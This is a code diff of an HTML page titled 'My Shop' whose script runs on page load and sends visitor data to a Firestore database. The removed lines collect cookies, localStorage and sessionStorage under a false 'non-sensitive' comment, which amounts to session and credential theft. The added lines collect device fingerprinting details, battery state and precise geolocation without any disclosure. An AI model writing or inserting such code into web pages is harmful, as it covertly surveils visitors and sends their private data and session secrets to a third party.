@@ -24,51 +24,63 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
 
-// Function to get device information
-function getDeviceInfo() {
-    return {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenResolution: `${screen.width}x${screen.height}`,
-        viewportResolution: `${window.innerWidth}x${window.innerHeight}`,
-        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timestamp: new Date().toISOString(),
-        // Additional information (non-sensitive)
-        cookies: document.cookie,
-        localStorageData: JSON.stringify(localStorage),
-        sessionStorageData: JSON.stringify(sessionStorage),
-        networkInfo: getNetworkInfo(),
-        installedPlugins: getInstalledPlugins()
-    };
-}
+        // Function to get device information
+        async function getDeviceInfo() {
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                viewportResolution: `${window.innerWidth}x${window.innerHeight}`,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString(),
+                battery: await getBatteryInfo(),
+                location: await getLocation(),
+                deviceTime: new Date().toLocaleString()
+            };
 
-// Function to get network information
-function getNetworkInfo() {
-    var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (connection) {
-        return {
-            type: connection.type,
-            effectiveType: connection.effectiveType
-        };
-    } else {
-        return 'Network information not supported.';
-    }
-}
+            console.log(deviceInfo);
+            return deviceInfo;
+        }
 
-// Function to get installed plugins
-function getInstalledPlugins() {
-    var pluginsList = [];
-    for (var i = 0; i < navigator.plugins.length; i++) {
-        pluginsList.push({
-            name: navigator.plugins[i].name,
-            filename: navigator.plugins[i].filename,
-            description: navigator.plugins[i].description
-        });
-    }
-    return pluginsList;
-}
+        // Function to get battery information
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level * 100 + '%',
+                    charging: battery.charging
+                };
+            } else {
+                return {
+                    level: 'N/A',
+                    charging: 'N/A'
+                };
+            }
+        }
 
+        // Function to get device location
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        }),
+                        error => reject({
+                            latitude: 'N/A',
+                            longitude: 'N/A'
+                        })
+                    );
+                } else {
+                    resolve({
+                        latitude: 'N/A',
+                        longitude: 'N/A'
+                    });
+                }
+            });
+        }
 
         // Function to save device information to Firestore
         function saveDeviceInfo(deviceInfo) {
@@ -82,16 +94,15 @@ function getInstalledPlugins() {
         }
 
         // Get and save device information on page load
-        window.onload = () => {
-            const deviceInfo = getDeviceInfo();
-            console.log("Device Info: ", deviceInfo); // Log the device information
+        window.onload = async () => {
+            const deviceInfo = await getDeviceInfo();
             saveDeviceInfo(deviceInfo);
         };
     </script>
 </head>
 <body>
     <header>
-        <h1>Welcome to My Shop2</h1>
+        <h1>Welcome to My Shop</h1>
     </header>
     <main>
         <section>
